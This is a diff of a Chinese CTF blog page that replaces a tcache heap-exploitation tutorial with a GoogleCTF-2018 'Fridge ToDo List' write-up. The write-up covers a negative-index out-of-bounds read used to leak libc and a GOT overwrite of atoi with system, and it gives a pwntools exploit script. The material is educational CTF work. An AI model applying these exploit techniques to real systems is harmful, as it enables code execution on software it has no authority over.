@@ -24,23 +24,26 @@
     var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="Tcache Attack其实做题时遇到过很多次tcache的东西，但一直没有系统的整理过一次。">
+  <meta name="description" content="GoogleCTF-2018 Fridge ToDo List开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。  打印列表 打印ToDo的任务 存储ToDo任务 删除ToDo任务 远程管理员 退出  首先第一个选项，就仅仅是打印，没什么输入，放弃。 第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。 第五个查看源码就知道只是一个">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn-Tcache_Attack">
-<meta property="og:url" content="https://mark0519.github.io/2021/07/10/pwn-Tcache-Attack/index.html">
+<meta property="og:title" content="pwn-GoogleCTF-2018-ToDo">
+<meta property="og:url" content="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/index.html">
 <meta property="og:site_name" content="Mark&#96;s blog">
-<meta property="og:description" content="Tcache Attack其实做题时遇到过很多次tcache的东西，但一直没有系统的整理过一次。">
+<meta property="og:description" content="GoogleCTF-2018 Fridge ToDo List开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。  打印列表 打印ToDo的任务 存储ToDo任务 删除ToDo任务 远程管理员 退出  首先第一个选项，就仅仅是打印，没什么输入，放弃。 第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。 第五个查看源码就知道只是一个">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-07-10T15:18:59.000Z">
-<meta property="article:modified_time" content="2021-07-12T04:04:15.079Z">
+<meta property="og:image" content="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png">
+<meta property="og:image" content="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png">
+<meta property="article:published_time" content="2021-07-28T11:08:56.000Z">
+<meta property="article:modified_time" content="2021-07-28T11:11:54.220Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png">
 
 
-<link rel="canonical" href="https://mark0519.github.io/2021/07/10/pwn-Tcache-Attack/">
+<link rel="canonical" href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/">
 
 
 <script class="page-configurations">
@@ -53,7 +56,7 @@
   };
 </script>
 
-  <title>pwn-Tcache_Attack | Mark`s blog</title>
+  <title>pwn-GoogleCTF-2018-ToDo | Mark`s blog</title>
   
 
 
@@ -181,7 +184,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Tcache-Attack"><span class="nav-number">1.</span> <span class="nav-text">Tcache Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Tcache"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 Tcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">内存申请：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-%E5%8F%96%E5%87%BA%EF%BC%9A"><span class="nav-number">1.1.2.</span> <span class="nav-text">tcache 取出：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Attack"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-poisoning"><span class="nav-number">1.2.1.</span> <span class="nav-text">tcache poisoning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-dup"><span class="nav-number">1.2.2.</span> <span class="nav-text">tcache dup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smallbin-unlink"><span class="nav-number">1.2.3.</span> <span class="nav-text">smallbin unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-leak"><span class="nav-number">1.2.4.</span> <span class="nav-text">libc leak</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 总结</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GoogleCTF-2018-Fridge-ToDo-List"><span class="nav-number">1.</span> <span class="nav-text">GoogleCTF-2018 Fridge ToDo List</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -250,7 +253,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/07/10/pwn-Tcache-Attack/">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -263,7 +266,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwn-Tcache_Attack
+          pwn-GoogleCTF-2018-ToDo
         </h1>
 
         <div class="post-meta-container">
@@ -273,16 +276,10 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2021-07-10 23:18:59" itemprop="dateCreated datePublished" datetime="2021-07-10T23:18:59+08:00">2021-07-10</time>
+      <time title="创建时间：2021-07-28 19:08:56 / 修改时间：19:11:54" itemprop="dateCreated datePublished" datetime="2021-07-28T19:08:56+08:00">2021-07-28</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-07-12 12:04:15" itemprop="dateModified" datetime="2021-07-12T12:04:15+08:00">2021-07-12</time>
-      </span>
 
   
     <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -301,30 +298,28 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="Tcache-Attack"><a href="#Tcache-Attack" class="headerlink" title="Tcache Attack"></a>Tcache Attack</h1><p>其实做题时遇到过很多次tcache的东西，但一直没有系统的整理过一次。</p>
-<a id="more"></a>
+        <h1 id="GoogleCTF-2018-Fridge-ToDo-List"><a href="#GoogleCTF-2018-Fridge-ToDo-List" class="headerlink" title="GoogleCTF-2018 Fridge ToDo List"></a>GoogleCTF-2018 Fridge ToDo List</h1><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p>
+<ol>
+<li>打印列表</li>
+<li>打印ToDo的任务</li>
+<li>存储ToDo任务</li>
+<li>删除ToDo任务</li>
+<li>远程管理员</li>
+<li>退出</li>
+</ol>
+<p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p>
+<p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p>
+<p>第五个查看源码就知道只是一个幌子。</p>
+<p>第六个没啥好说的，退出操作。</p>
+<p>看到第二个和第三个操作中都有同样的代码</p>
+<p><a target="_blank" rel="noopener" href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png" alt="img"></a></p>
+<p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p>
+<p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p>
+<p><a target="_blank" rel="noopener" href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png" alt="img"></a></p>
+<p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p>
+<p>这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="comment"># r = remote(&quot;fridge-todo-list.ctfcompetition.com&quot;,1337)</span></span><br><span class="line">r = process(<span class="string">&#x27;./todo&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&quot;mark\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;read?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;-6\n&quot;</span>)</span><br><span class="line">res = r.readuntil(<span class="string">&quot;Hi mark,&quot;</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">&#x27;:&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">&quot;&lt;Q&quot;</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;3\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;entry?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;-4\n&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;A&quot;</span>*<span class="number">8</span>+pack(<span class="string">&quot;&lt;Q&quot;</span>,system_addr)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x01-Tcache"><a href="#0x01-Tcache" class="headerlink" title="0x01 Tcache"></a>0x01 Tcache</h2><p><code>tcache_get()</code> 和 <code>tcache_put()</code>这两个函数会在函数 _int_free 和 __libc_malloc的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p>
-<p>我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
-<h3 id="内存申请："><a href="#内存申请：" class="headerlink" title="内存申请："></a>内存申请：</h3><p>在内存分配的malloc函数中有多处，会将内存块移入tcache中。</p>
-<p>（1）首先，申请的内存块符合fastbin大小时并且在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。</p>
-<p>（2）其次，申请的内存块符合smallbin大小时并且在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p>
-<p>（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p>
-<h3 id="tcache-取出："><a href="#tcache-取出：" class="headerlink" title="tcache 取出："></a>tcache 取出：</h3><p>在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。</p>
-<p>在循环处理unsorted bin内存块时，如果达到放入unsorted bin块最大数量，会立即返回。默认是0，即不存在上限。</p>
-<h2 id="0x02-Attack"><a href="#0x02-Attack" class="headerlink" title="0x02 Attack"></a>0x02 Attack</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
-<p>基本和Fastbin Attack一样，只是比Ffastbin少了很多检察，更容易利用</p>
-<h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>也基本类似于Fastbin dup，不过利用的是 <code>tcache_put()</code> 的不严谨</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
-<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
-<h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p>
-<h3 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h3><p>在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>之后，我们就可以 leak libc 了。</p>
-<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>tcache本身可以当成一个具有一些特殊性质的fastbin，利用操作都和Fastbin Attack差不太多。</p>
 
     </div>
 
@@ -342,7 +337,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://mark0519.github.io/2021/07/10/pwn-Tcache-Attack/" title="pwn-Tcache_Attack">https://mark0519.github.io/2021/07/10/pwn-Tcache-Attack/</a>
+      <a href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/" title="pwn-GoogleCTF-2018-ToDo">https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -360,14 +355,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/07/09/pwn-House-of-Force/" rel="prev" title="pwn-House_of_Force">
-                  <i class="fa fa-chevron-left"></i> pwn-House_of_Force
+                <a href="/2021/07/26/pwn-cybricCTF-GrOSs1%E5%A4%8D%E7%8E%B0/" rel="prev" title="pwn-cybricCTF-GrOSs1复现">
+                  <i class="fa fa-chevron-left"></i> pwn-cybricCTF-GrOSs1复现
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/07/12/pwn-unlink/" rel="next" title="pwn-unlink">
-                  pwn-unlink <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
